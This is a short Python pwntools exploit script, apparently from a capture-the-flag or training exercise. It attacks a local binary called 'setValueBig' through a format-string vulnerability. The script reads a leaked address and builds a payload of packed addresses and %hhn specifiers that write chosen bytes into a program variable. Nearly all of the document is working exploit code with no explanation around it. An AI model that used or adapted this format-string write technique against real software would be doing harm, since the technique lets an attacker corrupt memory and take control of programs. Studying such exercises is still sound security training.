#!/usr/bin/python3

## Use hhn, and rearrange writes
## + Smaller payload (ish) [51]
## - More effort
##   * Write a helper script!

from pwn import *

p = process('./setValueBig')

p.recvuntil("at address ")
val = int(p.recvline(keepends=False), 16)
log.info(f"Got address &someValue = {hex(val)}")

payload = b''
payload += p32(val)
payload += p32(val + 1)
payload += p32(val + 2)
payload += p32(val + 3)

# Smaller byte is 0xad == 173
payload += f"%{0xad - 16}c".encode()
payload += b"%6$hhn"
payload += b"%4$hhn"

# Larger byte is 0xde == 222
payload += f"%{0xde - 0xad}c".encode()
payload += b"%7$hhn"
payload += b"%5$hhn"

log.info(f"PAYLOAD LENGTH = {len(payload)}")

# 0xde = 222
# 0xad = 173

p.sendline(payload)
p.interactive()